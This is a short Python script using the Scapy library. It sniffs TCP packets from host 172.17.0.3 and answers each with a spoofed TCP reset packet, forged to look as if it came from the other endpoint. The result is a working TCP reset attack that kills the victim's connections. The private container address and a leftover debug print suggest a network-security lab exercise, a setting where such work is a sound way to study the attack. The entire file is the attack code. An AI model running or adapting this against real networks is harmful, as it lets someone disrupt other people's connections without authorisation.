#!/usr/bin/python3
from scapy.all import *

def spoof_tcp(pkt):
   IPLayer  = IP(dst="172.17.0.3", src=pkt[IP].dst)
   TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
                  dport=pkt[TCP].sport, sport=pkt[TCP].dport)
   spoofpkt = IPLayer/TCPLayer
   print("one")
   send(spoofpkt, verbose=0)

pkt=sniff(filter='tcp and src host 172.17.0.3', prn=spoof_tcp)
